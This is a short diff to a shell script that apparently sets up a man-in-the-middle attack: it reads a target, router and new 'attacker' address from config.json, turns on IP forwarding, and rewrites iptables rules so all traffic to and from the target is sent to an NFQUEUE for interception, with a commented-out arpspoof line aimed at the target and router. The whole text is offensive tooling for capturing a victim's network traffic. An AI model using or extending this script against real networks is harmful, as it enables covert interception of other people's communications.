@@ -8,6 +8,7 @@ fi
 interface=`jq -r '.interface' config.json`
 target=`jq -r '.target' config.json`
 router=`jq -r '.router' config.json`
+attacker=`jq -r '.attacker' config.json`
 
 echo "" > log
 
@@ -24,8 +25,10 @@ function end() {
 
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-iptables -A FORWARD -i $interface -d $target -j NFQUEUE --queue-num 0
-iptables -A FORWARD -i $interface -s $target -j NFQUEUE --queue-num 0
+#iptables -t nat -A POSTROUTING -i $interface -d $attacker -j NFQUEUE --queue-num 0
+#iptables -A FORWARD -i $interface -s $target -j NFQUEUE --queue-num 0
+iptables -A FORWARD -d $target -j NFQUEUE --queue-num 0
+iptables -A FORWARD -s $target -j NFQUEUE --queue-num 0
 
 #arpspoof -i $interface -t $target -r $router > arpspoof.log 2>&1 &
 #PID1=$!
